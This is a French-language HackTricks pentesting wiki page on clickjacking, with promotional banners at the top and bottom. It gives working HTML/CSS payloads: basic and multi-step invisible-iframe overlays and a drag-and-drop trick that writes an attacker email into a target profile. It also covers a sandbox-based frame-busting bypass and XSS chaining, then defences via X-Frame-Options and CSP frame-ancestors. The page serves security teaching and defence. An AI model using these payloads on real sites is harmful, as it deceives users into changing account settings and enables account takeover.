# Clickjacking

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.io/) pour cr√©er et **automatiser facilement des workflows** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Obtenez l'acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Qu'est-ce que le Clickjacking

Le Clickjacking est une attaque qui **trompe** un **utilisateur** en le faisant **cliquer** sur un **√©l√©ment** de la page web qui est **invisible** ou d√©guis√© en tant qu'autre √©l√©ment. Cela peut amener les utilisateurs √† t√©l√©charger involontairement des logiciels malveillants, √† visiter des pages web malveillantes, √† fournir des informations d'identification ou des informations sensibles, √† transf√©rer de l'argent ou √† acheter des produits en ligne. (De [ici](https://www.imperva.com/learn/application-security/clickjacking/)).

### Astuce de pr√©-remplissage de formulaires

Il est parfois possible de **remplir la valeur des champs d'un formulaire en utilisant des param√®tres GET lors du chargement d'une page**. Un attaquant peut abuser de ce comportement pour remplir un formulaire avec des donn√©es arbitraires et envoyer la charge utile de clickjacking afin que l'utilisateur appuie sur le bouton Soumettre.

### Remplir un formulaire avec Drag\&Drop

Si vous avez besoin que l'utilisateur **remplisse un formulaire** mais que vous ne voulez pas lui demander directement d'√©crire des informations sp√©cifiques (comme l'e-mail et/ou le mot de passe sp√©cifique que vous connaissez), vous pouvez simplement lui demander de **faire glisser et d√©poser** quelque chose qui √©crira vos donn√©es contr√¥l√©es comme dans [**cet exemple**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Charge utile de base
```markup
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.1;
       z-index: 2;
   }
   div {
       position:absolute;
       top:470px;
       left:60px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Charge utile √† plusieurs √©tapes

Le clickjacking peut √™tre utilis√© pour ex√©cuter des charges utiles √† plusieurs √©tapes. Dans ce sc√©nario, le clic de l'utilisateur d√©clenche une s√©rie d'actions qui m√®nent finalement √† l'exploitation de la cible. Par exemple, le clic peut d√©clencher une s√©rie de clics invisibles sur des boutons ou des liens qui effectuent des actions telles que l'ouverture d'une fen√™tre contextuelle, le t√©l√©chargement d'un fichier ou la soumission d'un formulaire. Ces actions peuvent √™tre utilis√©es pour ex√©cuter une charge utile plus complexe, telle que l'installation d'un malware ou la prise de contr√¥le d'un compte utilisateur.
```markup
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 500px;
       opacity: 0.1;
       z-index: 2;
   }
   .firstClick, .secondClick {
       position:absolute;
       top:330px;
       left:60px;
       z-index: 1;
   }
   .secondClick {
       left:210px;
   }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Charge utile Drag\&Drop + Clic
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Si vous avez identifi√© une attaque **XSS qui n√©cessite qu'un utilisateur clique** sur un √©l√©ment pour **d√©clencher** l'attaque XSS et que la page est **vuln√©rable au clickjacking**, vous pouvez l'exploiter pour tromper l'utilisateur en le faisant cliquer sur le bouton/lien.\
Exemple:\
_Vous avez trouv√© un **auto-XSS** dans certains d√©tails priv√©s du compte (d√©tails que **vous seul pouvez d√©finir et lire**). La page avec le **formulaire** pour d√©finir ces d√©tails est **vuln√©rable** au **clickjacking** et vous pouvez **pr√©-remplir** le **formulaire** avec les param√®tres GET._\
\_\_Un attaquant pourrait pr√©parer une attaque de **clickjacking** sur cette page en **pr√©-remplissant** le **formulaire** avec la **charge utile XSS** et en trompant l'utilisateur pour qu'il **soumette** le formulaire. Ainsi, **lorsque le formulaire est soumis** et que les valeurs sont modifi√©es, l'**utilisateur ex√©cutera l'XSS**.

## Comment √©viter le Clickjacking

### D√©fenses c√¥t√© client

Il est possible d'ex√©cuter des scripts c√¥t√© client qui effectuent certains ou tous les comportements suivants pour pr√©venir le Clickjacking :

* v√©rifier et forcer que la fen√™tre d'application actuelle est la fen√™tre principale ou sup√©rieure,
* rendre tous les cadres visibles,
* emp√™cher de cliquer sur des cadres invisibles,
* intercepter et signaler les attaques potentielles de clickjacking √† un utilisateur.

#### Contournement

Comme les destructeurs de cadres sont en JavaScript, les param√®tres de s√©curit√© du navigateur peuvent emp√™cher leur fonctionnement ou le navigateur peut ne pas prendre en charge JavaScript. Une m√©thode efficace pour contourner les destructeurs de cadres est d'utiliser l'**attribut HTML5 `sandbox` de l'iframe**. Lorsque cela est d√©fini avec les valeurs `allow-forms` ou `allow-scripts` et que la valeur `allow-top-navigation` est omise, le script destructeur de cadres peut √™tre neutralis√© car l'iframe ne peut pas v√©rifier s'il s'agit ou non de la fen√™tre sup√©rieure :
```markup
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
Les valeurs `allow-forms` et `allow-scripts` permettent toutes deux les actions sp√©cifi√©es dans l'iframe, mais la navigation de niveau sup√©rieur est d√©sactiv√©e. Cela emp√™che les comportements de frame busting tout en permettant la fonctionnalit√© dans le site cibl√©.

Selon le type d'attaque Clickjacking effectu√©e, **vous devrez peut-√™tre √©galement autoriser** `allow-same-origin` et `allow-modals` ou [m√™me plus](https://www.w3schools.com/tags/att\_iframe\_sandbox.asp). Lors de la pr√©paration de l'attaque, v√©rifiez simplement la console du navigateur, elle peut vous indiquer les autres comportements que vous devez autoriser.

### X-Frame-Options

L'en-t√™te de r√©ponse HTTP **`X-Frame-Options`** peut √™tre utilis√© pour indiquer si un navigateur doit √™tre **autoris√©** ou non √† afficher une page dans une balise `<frame>` ou `<iframe>`. Les sites peuvent l'utiliser pour √©viter les attaques de Clickjacking, en veillant √† ce que **leur contenu ne soit pas int√©gr√© dans d'autres sites**. D√©finissez l'en-t√™te **`X-Frame-Options`** pour toutes les r√©ponses contenant du contenu HTML. Les valeurs possibles sont :

* `X-Frame-Options: deny` qui **emp√™che tout domaine d'encadrer le contenu** (_valeur recommand√©e_)
* `X-Frame-Options: sameorigin` qui permet uniquement au **site actuel** d'encadrer le contenu.
* `X-Frame-Options: allow-from https://trusted.com` qui **autorise l'URI sp√©cifi√©** √† encadrer cette page.
  * V√©rifiez les limitations ci-dessous car **cela √©chouera si le navigateur ne le prend pas en charge**.
  * D'autres navigateurs prennent en charge la nouvelle directive **CSP frame-ancestors**. Quelques-uns prennent en charge les deux.

### Directive frame-ancestors de la politique de s√©curit√© du contenu (CSP)

La **protection recommand√©e contre le Clickjacking** consiste √† incorporer la directive **`frame-ancestors`** dans la politique de s√©curit√© du contenu de l'application.\
La directive **`frame-ancestors 'none'`** est similaire dans son comportement √† la directive **X-Frame-Options `deny`** (_personne ne peut encadrer la page_).\
La directive **`frame-ancestors 'self'`** est largement √©quivalente √† la directive **X-Frame-Options `sameorigin`** (_seul le site actuel peut l'encadrer_).\
La directive **`frame-ancestors trusted.com`** est largement √©quivalente √† la directive **X-Frame-Options** `allow-from` (_seul le site de confiance peut l'encadrer_).

La CSP suivante autorise les frames uniquement pour le m√™me domaine :

`Content-Security-Policy: frame-ancestors 'self';`

Consultez la documentation suivante pour plus de d√©tails et des exemples plus complexes :

* [https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)

### Limitations <a href="#limitations" id="limitations"></a>

* **Prise en charge du navigateur :** Les frame-ancestors CSP ne sont pas encore pris en charge par tous les principaux navigateurs.
* **X-Frame-Options a la priorit√© :** [Section "Relation to X-Frame-Options" of the CSP Spec](https://w3c.github.io/webappsec/specs/content-security-policy/#frame-ancestors-and-frame-options) dit : "_Si une ressource est livr√©e avec une politique qui inclut une directive nomm√©e frame-ancestors et dont la disposition est "enforce", alors l'en-t√™te X-Frame-Options DOIT √™tre ignor√©_", mais Chrome 40 et Firefox 35 ignorent la directive frame-ancestors et suivent plut√¥t l'en-t√™te X-Frame-Options.

## R√©f√©rences

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.io/) pour cr√©er et **automatiser facilement des workflows** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Obtenez l'acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
